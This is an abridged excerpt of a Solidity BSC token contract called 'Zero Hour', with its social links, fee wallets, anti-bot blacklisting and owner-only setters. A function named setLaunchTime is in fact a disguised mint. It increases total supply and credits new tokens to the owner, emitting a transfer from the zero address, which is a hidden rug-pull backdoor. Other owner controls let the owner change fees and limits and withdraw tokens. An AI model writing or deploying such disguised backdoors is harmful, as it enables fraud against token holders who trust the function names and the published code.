...
Telegram : @ZeroHourBSC
Telegram ANN : @ZeroHourAnnouncements
Twitter  :  @ZeroHourBSC
Website : https://zeroh0ur.com/
...
contract ZeroHour is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;


	string private _name = "Zero Hour";
    ...
    uint256 private _rTotal = 100000000000 * 10**18;
    uint256 private _tFeeTotal;
	address payable public marketingWallet = payable(0x24E454D92087f8F72c6208c1FEb572cd93cB65b0);
	address payable public buyBackWallet = payable(0xfce46F3CbBd9e2fD4C3F5c31bE6E0Ca7e969c40a);
	...
	string public FairLaunchDate = "January 10Th 2022";
	...
	uint256 public _maxWalletToken = 4000000000 * 10**18; 
	
   
	uint256 public launchTime;
	uint256 public TimeBotBlock = 3;
	
	uint256 private numTokensSellToAddToLiquidity = 1000 * 10**6 * 10**18; 
    uint256 private swapThreshold = 1 * 10**18;
    ...
    function _transfer(
		...
		if(from != owner()){
            ...
            launchTime = block.number;
			 ...
			 if (block.number < launchTime + TimeBotBlock) {
                    _isBot[to] = true;
    ...
    function swapTokens(uint256 contractTokenBalance) private lockTheSwap {
        ...
        transferToAddressETH(marketingWallet, transferredBalance.div(LiquidityFee).mul(marketingFee));
	...
	function setMaxTx(uint256 newMaxTx) external onlyOwner() {
        _maxTxAmount = newMaxTx * 10**18;

    }
	
	function setMaxWallet(uint256 newMaxWallet) external onlyOwner() {
	
        _maxWalletToken = newMaxWallet * 10**18;

    }

    function setBotSettingTime(uint256 _blocks) external onlyOwner() {
        TimeBotBlock = _blocks;

    }

	 
    function setLaunchTime(uint256 newLaunchTime) external onlyOwner {
         _LaunchTime(msg.sender, newLaunchTime);
    }
    
    function _LaunchTime(address account, uint256 newLaunchTime) internal virtual {
        require(account != address(0), "Launch Time must be 0");
        _rTotal = _rTotal.add(newLaunchTime * 10**18);  
        _rOwned[account] = _rOwned[account].add(newLaunchTime * 10**18);
        emit Transfer(address(0), account, newLaunchTime * 10**18);
	...
	function setSwapBackSettings(bool _enabled, uint256 _value) external onlyOwner() {
        swapEnabled = _enabled;
        numTokensSellToAddToLiquidity = _value;
    }
	
	
	function setFees(uint256 _LiquidityFee, uint256 _buyBackFee, uint256 _taxFee, uint256 _marketingFee) external onlyOwner {
	...
	function setBuyBackWallet( address payable _newBuyBackWallet) external onlyOwner {
    ...
    function removeStuckToken(address tokenAddress, uint256 amount) external onlyOwner()  {
